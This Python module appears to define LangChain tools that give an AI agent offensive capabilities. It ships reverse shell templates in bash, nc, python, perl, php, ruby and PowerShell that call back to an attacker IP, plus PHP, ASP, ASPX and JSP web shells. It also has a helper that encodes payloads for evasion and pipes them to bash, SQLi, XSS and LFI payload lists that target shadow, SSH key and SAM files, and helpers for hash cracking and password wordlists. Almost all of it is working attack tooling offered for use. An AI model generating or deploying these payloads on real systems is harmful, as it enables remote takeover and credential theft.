"""
Pentest Tools - Offensive Security Utilities
Tools for authorized penetration testing and security research.

⚠️  AUTHORIZED USE ONLY - For legitimate security testing.

Tools:
- generate_reverse_shell: Create reverse shell payloads
- encode_payload: Encode payloads (base64, url, hex)
- generate_webshell: Create web shell payloads
- sqli_payloads: SQL injection test payloads
- xss_payloads: XSS test payloads
- hash_analyzer: Analyze hashes with cracking suggestions
- parse_nmap: Parse nmap output
- generate_wordlist: Create custom wordlists
- lfi_payloads: LFI/path traversal payloads
- exploit_suggester: Suggest exploits based on service/version
"""

import base64
import urllib.parse
import hashlib
import re
from typing import Optional, List
from langchain_core.tools import tool


# Common reverse shell templates
REVERSE_SHELLS = {
    "bash": 'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
    "bash_udp": 'bash -i >& /dev/udp/{ip}/{port} 0>&1',
    "python": '''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' ''',
    "python_short": '''python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")' ''',
    "nc": 'nc -e /bin/sh {ip} {port}',
    "nc_mkfifo": 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f',
    "php": '''php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");' ''',
    "perl": '''perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};' ''',
    "ruby": '''ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' ''',
    "powershell": '''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"''',
}


@tool
def generate_reverse_shell(ip: str, port: int, shell_type: str = "bash") -> str:
    """
    Generate reverse shell payload for authorized pentesting.

    Args:
        ip: Attacker IP address (your listener)
        port: Attacker port (your listener port)
        shell_type: Shell type (bash, python, nc, php, perl, ruby, powershell)

    Returns:
        Ready-to-use reverse shell command

    Examples:
        generate_reverse_shell("10.10.14.5", 4444, "bash")
        generate_reverse_shell("10.10.14.5", 9001, "python")
        generate_reverse_shell("192.168.1.100", 443, "powershell")

    Available types: bash, bash_udp, python, python_short, nc, nc_mkfifo, php, perl, ruby, powershell
    """
    if shell_type not in REVERSE_SHELLS:
        available = ", ".join(REVERSE_SHELLS.keys())
        return f"Unknown shell type '{shell_type}'. Available: {available}"

    payload = REVERSE_SHELLS[shell_type].format(ip=ip, port=port)

    return f"""Reverse Shell ({shell_type})
========================
Listener: nc -lvnp {port}

Payload:
{payload}

URL Encoded:
{urllib.parse.quote(payload)}

Base64:
{base64.b64encode(payload.encode()).decode()}
"""


@tool
def encode_payload(payload: str, encoding: str = "base64") -> str:
    """
    Encode payload for evasion or transport.

    Args:
        payload: The payload string to encode
        encoding: Encoding type (base64, url, hex, double_url, unicode)

    Returns:
        Encoded payload with decoder command

    Examples:
        encode_payload("id; whoami", "base64")
        encode_payload("<script>alert(1)</script>", "url")
    """
    result = [f"Original: {payload}", f"Encoding: {encoding}", ""]

    if encoding == "base64":
        encoded = base64.b64encode(payload.encode()).decode()
        result.append(f"Encoded: {encoded}")
        result.append(f"\nDecode (bash): echo '{encoded}' | base64 -d")
        result.append(f"Execute (bash): echo '{encoded}' | base64 -d | bash")

    elif encoding == "url":
        encoded = urllib.parse.quote(payload)
        result.append(f"Encoded: {encoded}")

    elif encoding == "double_url":
        encoded = urllib.parse.quote(urllib.parse.quote(payload))
        result.append(f"Encoded: {encoded}")

    elif encoding == "hex":
        encoded = payload.encode().hex()
        result.append(f"Encoded: {encoded}")
        result.append(f"\nDecode (Python): bytes.fromhex('{encoded}').decode()")

    elif encoding == "unicode":
        encoded = "".join(f"\\u{ord(c):04x}" for c in payload)
        result.append(f"Encoded: {encoded}")

    else:
        return f"Unknown encoding. Available: base64, url, double_url, hex, unicode"

    return "\n".join(result)


@tool
def generate_webshell(language: str = "php", password: Optional[str] = None) -> str:
    """
    Generate web shell for authorized pentesting.

    Args:
        language: Web shell language (php, asp, aspx, jsp)
        password: Optional password protection

    Returns:
        Web shell code

    Examples:
        generate_webshell("php")
        generate_webshell("php", "s3cr3t")
    """
    shells = {
        "php": '''<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>''',
        "php_password": '''<?php if(isset($_REQUEST['cmd']) && isset($_REQUEST['pwd']) && $_REQUEST['pwd']=='{pwd}'){ echo "<pre>"; system($_REQUEST['cmd']); echo "</pre>"; die; }?>''',
        "asp": '''<%eval request("cmd")%>''',
        "aspx": '''<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><% Process.Start(new ProcessStartInfo("cmd.exe","/c " + Request["cmd"]){UseShellExecute=false,RedirectStandardOutput=true}).StandardOutput.ReadToEnd(); %>''',
        "jsp": '''<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>''',
    }

    if language == "php" and password:
        shell = shells["php_password"].replace("{pwd}", password)
        usage = f"Usage: shell.php?pwd={password}&cmd=whoami"
    elif language in shells:
        shell = shells[language]
        usage = f"Usage: shell.{language}?cmd=whoami"
    else:
        return f"Unknown language. Available: php, asp, aspx, jsp"

    return f"""Web Shell ({language})
==================
{shell}

{usage}

Base64:
{base64.b64encode(shell.encode()).decode()}
"""


@tool
def sqli_payloads(db_type: str = "mysql", technique: str = "union") -> str:
    """
    Generate SQL injection test payloads.

    Args:
        db_type: Database type (mysql, mssql, oracle, postgres, sqlite)
        technique: Injection technique (union, error, blind, time)

    Returns:
        List of SQLi payloads to test

    Examples:
        sqli_payloads("mysql", "union")
        sqli_payloads("mssql", "error")
    """
    payloads = {
        "mysql": {
            "union": [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT @@version,NULL,NULL--",
                "' UNION SELECT table_name,NULL FROM information_schema.tables--",
                "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
            ],
            "error": [
                "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--",
            ],
            "blind": [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND SUBSTRING(@@version,1,1)='5'--",
            ],
            "time": [
                "' AND SLEEP(5)--",
                "' AND IF(1=1,SLEEP(5),0)--",
                "'; WAITFOR DELAY '0:0:5'--",
            ],
        },
        "mssql": {
            "union": [
                "' UNION SELECT NULL--",
                "' UNION SELECT @@version--",
                "' UNION SELECT name FROM master..sysdatabases--",
            ],
            "error": [
                "' AND 1=CONVERT(int,@@version)--",
            ],
            "time": [
                "'; WAITFOR DELAY '0:0:5'--",
                "'; IF (1=1) WAITFOR DELAY '0:0:5'--",
            ],
        },
    }

    db = payloads.get(db_type, payloads["mysql"])
    technique_payloads = db.get(technique, db.get("union", []))

    result = [f"SQLi Payloads ({db_type} - {technique})", "=" * 40]
    for i, p in enumerate(technique_payloads, 1):
        result.append(f"{i}. {p}")
        result.append(f"   URL: {urllib.parse.quote(p)}")

    return "\n".join(result)


@tool
def xss_payloads(context: str = "html", bypass: str = "none") -> str:
    """
    Generate XSS test payloads.

    Args:
        context: Injection context (html, attribute, javascript, url)
        bypass: Filter bypass technique (none, case, encoding, polyglot)

    Returns:
        List of XSS payloads to test

    Examples:
        xss_payloads("html")
        xss_payloads("attribute", "encoding")
    """
    payloads = {
        "html": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<iframe src='javascript:alert(1)'>",
        ],
        "attribute": [
            '" onmouseover="alert(1)',
            "' onfocus='alert(1)' autofocus='",
            '" onfocus=alert(1) autofocus="',
            "javascript:alert(1)",
        ],
        "javascript": [
            "'-alert(1)-'",
            "\\'-alert(1)//",
            "</script><script>alert(1)</script>",
        ],
        "bypass": [
            "<ScRiPt>alert(1)</sCrIpT>",
            "<img src=x onerror=alert`1`>",
            "<svg/onload=alert(1)>",
            "&#60;script&#62;alert(1)&#60;/script&#62;",
            "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
        ],
        "polyglot": [
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
            "'\"--></style></script><script>alert(1)</script>",
        ],
    }

    context_payloads = payloads.get(context, payloads["html"])
    if bypass != "none":
        context_payloads += payloads.get("bypass", [])

    result = [f"XSS Payloads ({context})", "=" * 40]
    for i, p in enumerate(context_payloads, 1):
        result.append(f"{i}. {p}")
        result.append(f"   URL: {urllib.parse.quote(p)}")

    return "\n".join(result)


@tool
def lfi_payloads(os_type: str = "linux") -> str:
    """
    Generate LFI/Path Traversal payloads.

    Args:
        os_type: Target OS (linux, windows)

    Returns:
        List of LFI payloads to test

    Examples:
        lfi_payloads("linux")
        lfi_payloads("windows")
    """
    linux_paths = [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/etc/ssh/sshd_config",
        "/root/.ssh/id_rsa",
        "/root/.bash_history",
        "/var/log/auth.log",
        "/proc/self/environ",
        "/proc/self/cmdline",
    ]

    windows_paths = [
        "C:\\Windows\\System32\\config\\SAM",
        "C:\\Windows\\repair\\SAM",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\inetpub\\wwwroot\\web.config",
        "C:\\xampp\\apache\\conf\\httpd.conf",
    ]

    paths = linux_paths if os_type == "linux" else windows_paths
    traversals = ["../", "..\\", "....//", "..%2f", "%2e%2e/", "%2e%2e%2f"]

    result = [f"LFI Payloads ({os_type})", "=" * 40, "\nTarget files:"]
    for p in paths:
        result.append(f"  {p}")

    result.append("\nTraversal patterns (prepend to path):")
    for depth in [3, 5, 7]:
        for t in traversals[:3]:
            result.append(f"  {t * depth}")

    result.append("\nNull byte bypass (PHP < 5.3):")
    result.append("  ../../../etc/passwd%00")

    result.append("\nWrapper bypass:")
    result.append("  php://filter/convert.base64-encode/resource=config.php")
    result.append("  data://text/plain,<?php system($_GET['cmd']); ?>")

    return "\n".join(result)


@tool
def hash_analyzer(hash_value: str) -> str:
    """
    Analyze hash type and suggest cracking commands.

    Args:
        hash_value: The hash to analyze

    Returns:
        Hash type with hashcat/john cracking commands

    Examples:
        hash_analyzer("5d41402abc4b2a76b9719d911017c592")
        hash_analyzer("$6$rounds=5000$salt$hash...")
    """
    hash_len = len(hash_value)
    result = [f"Hash: {hash_value}", f"Length: {hash_len}", ""]

    types = []

    # Check by length and pattern
    if hash_len == 32 and re.match(r'^[a-f0-9]+$', hash_value.lower()):
        types.append(("MD5", "hashcat -m 0", "john --format=raw-md5"))
    if hash_len == 40 and re.match(r'^[a-f0-9]+$', hash_value.lower()):
        types.append(("SHA1", "hashcat -m 100", "john --format=raw-sha1"))
    if hash_len == 64 and re.match(r'^[a-f0-9]+$', hash_value.lower()):
        types.append(("SHA256", "hashcat -m 1400", "john --format=raw-sha256"))
    if hash_len == 128 and re.match(r'^[a-f0-9]+$', hash_value.lower()):
        types.append(("SHA512", "hashcat -m 1700", "john --format=raw-sha512"))

    # Check for specific formats
    if hash_value.startswith("$1$"):
        types.append(("MD5crypt", "hashcat -m 500", "john --format=md5crypt"))
    if hash_value.startswith("$5$"):
        types.append(("SHA256crypt", "hashcat -m 7400", "john --format=sha256crypt"))
    if hash_value.startswith("$6$"):
        types.append(("SHA512crypt", "hashcat -m 1800", "john --format=sha512crypt"))
    if hash_value.startswith("$2") and "$" in hash_value[3:]:
        types.append(("bcrypt", "hashcat -m 3200", "john --format=bcrypt"))
    if hash_value.startswith("$apr1$"):
        types.append(("Apache MD5", "hashcat -m 1600", "john --format=md5apr1"))
    if re.match(r'^[a-f0-9]{32}:[a-f0-9]+$', hash_value.lower()):
        types.append(("MD5 + Salt", "hashcat -m 10/20", "john --format=dynamic"))

    if types:
        result.append("Possible types:")
        for t, hc, jn in types:
            result.append(f"  {t}")
            result.append(f"    Hashcat: {hc} hash.txt wordlist.txt")
            result.append(f"    John: {jn} hash.txt")
    else:
        result.append("Unknown hash type")
        result.append("Try: hash-identifier or hashid tools")

    return "\n".join(result)


@tool
def generate_wordlist(base_words: str, rules: str = "basic") -> str:
    """
    Generate custom wordlist from base words.

    Args:
        base_words: Comma-separated base words (company, name, year)
        rules: Mutation rules (basic, leet, years, full)

    Returns:
        Generated wordlist

    Examples:
        generate_wordlist("admin,password,company", "basic")
        generate_wordlist("john,smith,acme", "full")
    """
    words = [w.strip() for w in base_words.split(",")]
    wordlist = set(words)

    # Basic mutations
    if rules in ["basic", "full"]:
        for w in words:
            wordlist.add(w.lower())
            wordlist.add(w.upper())
            wordlist.add(w.capitalize())
            wordlist.add(w + "123")
            wordlist.add(w + "!")
            wordlist.add(w + "1")

    # Leet speak
    if rules in ["leet", "full"]:
        leet_map = {"a": "4", "e": "3", "i": "1", "o": "0", "s": "5", "t": "7"}
        for w in list(wordlist):
            leet = w.lower()
            for char, rep in leet_map.items():
                leet = leet.replace(char, rep)
            wordlist.add(leet)

    # Years
    if rules in ["years", "full"]:
        for w in words:
            for year in range(2020, 2027):
                wordlist.add(f"{w}{year}")
                wordlist.add(f"{w}@{year}")

    # Common suffixes
    if rules == "full":
        suffixes = ["!", "@", "#", "123", "1234", "12345", "!", "!!", "@123"]
        for w in words:
            for s in suffixes:
                wordlist.add(w + s)
                wordlist.add(w.capitalize() + s)

    result = sorted(wordlist)
    output = [f"Generated Wordlist ({len(result)} words)", "=" * 40]
    output.extend(result[:100])
    if len(result) > 100:
        output.append(f"... and {len(result) - 100} more")

    output.append(f"\nSave: echo '{chr(10).join(result[:50])}' > wordlist.txt")

    return "\n".join(output)


@tool
def exploit_suggester(service: str, version: Optional[str] = None) -> str:
    """
    Suggest exploits based on service and version.

    Args:
        service: Service name (ssh, apache, nginx, mysql, smb, etc.)
        version: Optional version number

    Returns:
        Suggested exploits and searchsploit commands

    Examples:
        exploit_suggester("apache", "2.4.49")
        exploit_suggester("vsftpd", "2.3.4")
        exploit_suggester("smb")
    """
    result = [f"Exploit Suggestions: {service} {version or ''}", "=" * 50]

    # Common vulnerable versions
    vulns = {
        "vsftpd 2.3.4": ["CVE-2011-2523 - Backdoor Command Execution", "Metasploit: exploit/unix/ftp/vsftpd_234_backdoor"],
        "apache 2.4.49": ["CVE-2021-41773 - Path Traversal", "CVE-2021-42013 - RCE"],
        "apache 2.4.50": ["CVE-2021-42013 - Path Traversal/RCE"],
        "proftpd 1.3.5": ["CVE-2015-3306 - mod_copy RCE"],
        "openssh 7.2": ["CVE-2016-6515 - User Enumeration"],
        "smb": ["EternalBlue (MS17-010)", "SambaCry (CVE-2017-7494)"],
        "mysql": ["CVE-2012-2122 - Auth Bypass (old versions)"],
        "tomcat": ["CVE-2017-12615 - PUT RCE", "Default creds: tomcat:tomcat, admin:admin"],
        "jenkins": ["CVE-2019-1003000 - Script Console RCE", "Groovy console if accessible"],
        "wordpress": ["xmlrpc.php brute force", "wp-config.php exposure", "Plugin vulns"],
    }

    # Check for known vulns
    key = f"{service.lower()} {version}" if version else service.lower()
    found = False
    for k, v in vulns.items():
        if service.lower() in k.lower() or k.lower() in key.lower():
            result.append(f"\nKnown vulnerabilities for {k}:")
            for vuln in v:
                result.append(f"  - {vuln}")
            found = True

    # Generic search commands
    result.append("\nSearch commands:")
    result.append(f"  searchsploit {service} {version or ''}")
    result.append(f"  msfconsole -q -x 'search {service}'")
    result.append(f"  nmap --script vuln -p <port> <target>")

    # Online resources
    result.append("\nOnline databases:")
    result.append(f"  https://exploit-db.com/search?q={service}")
    result.append(f"  https://cvedetails.com/vulnerability-search.php?q={service}")
    result.append(f"  https://nvd.nist.gov/vuln/search?query={service}")

    return "\n".join(result)


# Export tools for registration
TOOLS = [
    generate_reverse_shell,
    encode_payload,
    generate_webshell,
    sqli_payloads,
    xss_payloads,
    lfi_payloads,
    hash_analyzer,
    generate_wordlist,
    exploit_suggester,
]

TOOL_DESCRIPTIONS = {
    "generate_reverse_shell": "Create reverse shell payloads (bash, python, nc, php, etc.)",
    "encode_payload": "Encode payloads (base64, url, hex) for evasion",
    "generate_webshell": "Create web shell payloads (php, asp, jsp)",
    "sqli_payloads": "Generate SQL injection test payloads",
    "xss_payloads": "Generate XSS test payloads",
    "lfi_payloads": "Generate LFI/path traversal payloads",
    "hash_analyzer": "Analyze hash types with hashcat/john commands",
    "generate_wordlist": "Create custom wordlists from base words",
    "exploit_suggester": "Suggest exploits based on service/version",
}
